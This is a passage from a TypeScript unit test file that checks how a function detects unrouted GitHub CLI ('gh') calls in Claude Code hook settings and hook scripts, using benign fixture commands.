        '.claude/hooks/apart.sh': '#!/bin/bash\nexport gh\nB=1\n[ "$CLAUDE_CODE_REMOTE" = true ] || exit 0\n',
      },
    );
    assert.deepEqual(hooksHittingLock(sys), ['.claude/settings.json SessionStart hook .claude/hooks/apart.sh']);
  });

  it('judges the command and its script apart', () => {
    const sys = withHooks({ Stop: ['.claude/hooks/tail.sh gh'] }, { '.claude/hooks/tail.sh': 'B=1\n' });
    assert.deepEqual(hooksHittingLock(sys), ['.claude/settings.json Stop hook .claude/hooks/tail.sh']);
  });

  it('asks git for the toplevel from the working directory, and reads nothing when it has none', () => {
    const sys = withHooks({ Stop: ['gh pr view'] });
    sys.cwd = `${ROOT}/sub`;
    assert.equal(hooksHittingLock(sys).length, 1);
    assert.deepEqual(sys.calls, [{ command: 'git', args: ['rev-parse', '--show-toplevel'], cwd: `${ROOT}/sub` }]);
    const outside = new FakeSys();
    outside.inRepo = false;
    outside.files.set('/.claude/settings.json', JSON.stringify({ hooks: { Stop: [{ hooks: [{ type: 'command', command: 'gh pr view' }] }] } }));
    assert.deepEqual(hooksHittingLock(outside), []);
  });

  it('skips an event whose hooks are not a list, and an entry that is null', () => {
    const sys = new FakeSys();
    sys.files.set(`${ROOT}/.claude/settings.json`, JSON.stringify({ hooks: { Stop: {}, PreToolUse: [{ hooks: [{ type: 'command', command: 'gh pr list' }] }] } }));
    sys.files.set(`${ROOT}/.claude/settings.local.json`, 'null');
    sys.files.set(`${ROOT}/.claude/sarathi.json`, JSON.stringify({ hooks: { Stop: {}, PreToolUse: [null, { command: 'gh pr view' }] } }));
    assert.deepEqual(hooksHittingLock(sys), ['.claude/settings.json PreToolUse hook "gh pr list"', '.claude/sarathi.json PreToolUse handler "gh pr view"']);
    sys.files.set(`${ROOT}/.claude/settings.json`, JSON.stringify({ hooks: null }));
    assert.deepEqual(hooksHittingLock(sys), ['.claude/sarathi.json PreToolUse handler "gh pr view"']);
  });

  it('tracks quotes and escapes to find where a comment starts', () => {
    const cases: [string, string, boolean][] = [
      ['closed', `echo "a" # gh pr view`, false],
      ['single-backslash', `echo 'a\\' # gh pr view`, false],
      ['escaped-quote', `echo \\" # gh pr view`, false],
      ['in-single', `echo 'a # gh pr view'`, true],
      ['glued', 'echo a# && gh pr view', true],
    ];
    const sys = withHooks({ PreToolUse: cases.map(([name]) => `.claude/hooks/${name}.sh`) }, Object.fromEntries(cases.map(([name, line]) => [`.claude/hooks/${name}.sh`, `#!/bin/sh\n${line}\n`])));
    assert.deepEqual(
      hooksHittingLock(sys),
      cases.filter(([, , named]) => named).map(([name]) => `.claude/settings.json PreToolUse hook .claude/hooks/${name}.sh`),
    );
  });

  it("reads gh set in the positional parameters as routed only by the exact forms, spaced as bash takes them", () => {
    const agent = 'set -- "$cli" as-agent --session "$sid" -- gh';
    const cases: [string, string, boolean][] = [
      ['plain-args', `set -- gh api x\n[ -x "$cli" ] && ${agent}\n"$@" pr view`, false],
      ['else-spaced', `if [ -x "$cli" ]; then ${agent}; else  set -- gh; fi\n"$@" api`, false],
      ['set-spaced', `set  -- gh\n${agent}\n"$@" api`, false],
      ['dashes-spaced', `set --  gh\n${agent}\n"$@" api`, false],
      ['echoed-plain', `echo set -- gh\n${agent}\n"$@" api`, true],
      ['echoed-agent', `set -- gh\necho ${agent}\n"$@" api`, true],
      ['then-spaced-agent', `set -- gh\nif [ -x "$cli" ]; then  ${agent}; fi\n"$@" api`, false],
      ['set-spaced-agent', `set -- gh\nset  -- "$cli" as-agent --session "$sid" -- gh\n"$@" api`, false],
      ['gh-spaced-agent', `set -- gh\nset -- "$cli" as-agent --session "$sid" --  gh\n"$@" api`, false],
      ['gh-args-agent', `set -- gh\n${agent} api\n"$@" pr view`, false],
    ];
    const sys = withHooks({ PreToolUse: cases.map(([name]) => `.claude/hooks/${name}.sh`) }, Object.fromEntries(cases.map(([name, text]) => [`.claude/hooks/${name}.sh`, `#!/bin/bash\n${text}\n`])));
    assert.deepEqual(
      hooksHittingLock(sys),
      cases.filter(([, , named]) => named).map(([name]) => `.claude/settings.json PreToolUse hook .claude/hooks/${name}.sh`),
    );
  });

  it('finds the script a command runs past its interpreter, and none outside the repo', () => {
    const files = { '.claude/hooks/pr.sh': 'gh pr view\n', '.claude/$CLAUDE_PROJECT_DIR/pr.sh': 'gh pr view\n', '/abs.sh': 'gh pr view\n', '$HOME/x.sh': 'gh pr view\n', '~/x.sh': 'gh pr view\n' };
    const found = ['sh', 'zsh', 'bash', 'bash ', 'node', 'node ', 'python', 'python3', 'python3 '].map((runner) => `${runner} .claude/hooks/pr.sh`);
    const commands = [...found, './.claude/hooks/pr.sh', '.claude/./hooks/pr.sh', '.claude/$CLAUDE_PROJECT_DIR/pr.sh', '/abs.sh', '$HOME/x.sh', '~/x.sh', '   '];
    const named = [...[...found, './.claude/hooks/pr.sh'].map(() => '.claude/hooks/pr.sh'), '.claude/$CLAUDE_PROJECT_DIR/pr.sh'];
    assert.deepEqual(hooksHittingLock(withHooks({ PreToolUse: commands }, files)), named.map((path) => `.claude/settings.json PreToolUse hook ${path}`));
  });
});
